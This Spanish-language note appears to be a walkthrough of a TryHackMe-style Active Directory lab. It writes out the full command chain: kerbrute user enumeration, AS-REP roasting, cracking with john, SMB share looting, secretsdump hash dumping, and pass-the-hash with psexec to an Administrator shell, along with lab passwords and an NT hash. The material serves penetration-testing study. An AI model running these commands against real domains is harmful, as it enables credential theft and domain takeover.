Realizamos un escaneo de nmap y encontramos los siguientes puertos abiertos
![[Pasted image 20240717073153.png]]
![[Pasted image 20240717073229.png]]

Agregamos los nombres de la maquina a nuestra host
![[Pasted image 20240717073612.png]]

Hacemos una enumeración con enum4linux
![[Pasted image 20240717073714.png]]

Y encontramos unos posibles usuarios y grupos
![[Pasted image 20240717073808.png]]

Ahora realizamos una enumeracion de usuarios con kerbrute y encontramos que hay un usuario que no necesita credenciales para validarse
```
kerbrute userenum --dc 10.10.143.170 -d THM-AD userlist.txt -o users.txt
```
![[Pasted image 20240717103359.png]]

Ahora en este punto podemos hacer uso de [[4 - ASREPRoasting con Kerbrute y GetNPUsers]] para enviar una petición como este usuario y recibir el TGT con la contraseña hasheada del mismo
```
GetNPUsers.py spookysec.local/svc-admin -no-pass
```
![[Pasted image 20240717104000.png]]

Y ahora podemos crackearlo con john the ripper
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
![[Pasted image 20240717104616.png]]

Y ya tenemos las credenciales del usuario svc-admin:
```python
usuario --> svc-admin
contraseña --> management2005
```

Ahora podemos listar los recursos con smbclient
```
smbclient -L spookysec.local --user svc-admin --password management2005
```
![[Pasted image 20240717105349.png]]

Ahora accedemos a la ruta de backup y encontramos unas credenciales
```
smbclient \\\\spookysec.local\\backup --user svc-admin --password management2005
```
![[Pasted image 20240717105653.png]]

Nos descargamos el fichero
```
get backup_credentials.txt
```
![[Pasted image 20240717105748.png]]

Al leer el fichero encontramos el contenido encriptado en base64
![[Pasted image 20240717105923.png]]

La desencriptamos
![[Pasted image 20240717110257.png]]
```
backup@spookysec.local:backup2517860
```

Ahora que hemos visto que en el recurso compartido del usuario backup pudimos descargar un hash, vamos a utilizar una herramienta que se llama secretdump de impacket para dumpear los hashes de todos los usuarios del dominio [[Secretdump]]
```
secretsdump.py -just-dc backup@10.10.143.170
```
![[Pasted image 20240717113907.png]]

Y ahora que tenemos el hash del usuario administrador, podemos loguearnos directamente y obtener una reverse shell proporiconando simplemente este hash, lo cual se conoce comopass the hash, [[6 - Pass The Hash con psexec y wmiexec]]:
```
psexec.py Administrator@spookysec.local -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
```
![[Pasted image 20240717113510.png]]


--------
Podemos utilizar la herramienta **bloodhound** para obtener mas informacion sobre el sistema y el dominio
```
bloodhound-python -u svc-admin -p management2005 -ns 10.10.193.144 -d spookysec.local -c all
```
![[Pasted image 20240718092111.png]]
- `-u`: Especifica el usuario
- `-p`: Especifica la contraseña
- `-ns 10.10.193.144`: Indica la dirección IP (`10.10.193.144`) del servidor DNS que se utilizará para resolver nombres en el dominio (`spookysec.local`)
- `-d spookysec.local`: Especifica el nombre del dominio de Active Directory
- `-c all`: Indica que se deben recoger todos los datos posibles durante la exploración

Ahora solo falta cargar los archivos en `bloodhound` y ya nos mostrara toda la información, para cargar la información tenemos este boton
![[Pasted image 20240718092255.png]]

Y seleccionamos los ficheros previamente obtenidos
![[Pasted image 20240718092328.png]]

Aqui podremos ver los avances de la subida
![[Pasted image 20240718092402.png]]

Ahora con toda la información subida si accedemos al menu de arriba a la izquierda y seleccionamos el usuario comprometido podremos revisar toda la información
![[Pasted image 20240718093035.png]]

Seleccionamos al usuario como owned
![[Pasted image 20240718093105.png]]

Y ahora si vamos a analizar podremos revisar todas sus vulnerabilidades y a que tenemos acceso con este usuario y como escalar privilegios
![[Pasted image 20240718093219.png]]


-----
también podemos usar las mismas herramientas pero nativas de Kali linux con el prefijo `impacket`
```
impacket-psexec Administrator@spookysec.local -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
```
![[Pasted image 20240717113302.png]]

```
impacket-secretsdump -just-dc backup@10.10.143.170
```
![[Pasted image 20240717112613.png]]